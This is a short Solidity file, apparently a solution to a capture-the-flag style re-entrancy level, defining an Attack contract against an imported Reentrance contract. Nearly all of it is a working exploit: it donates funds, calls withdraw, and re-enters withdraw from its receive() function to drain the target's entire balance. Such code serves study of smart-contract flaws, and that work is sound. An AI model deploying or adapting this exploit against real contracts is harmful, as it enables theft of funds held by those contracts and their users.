// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "../Re-entrancy/Reentrancy.sol";

contract Attack {
    Reentrance public reentrancy;
    uint256 public attackAmount;

    constructor(Reentrance _reentrancy) public payable {
        reentrancy = _reentrancy;
        attackAmount = msg.value;
        reentrancy.donate{value: msg.value}(address(this));  // Initial donate to set balance
    }

    function attack() external {
        reentrancy.withdraw(attackAmount);  // Start re-entrancy loop
    }

    receive() external payable {
        if (address(reentrancy).balance > 0) {  // Soft condition to drain all
            reentrancy.withdraw(attackAmount);
        }
    }
}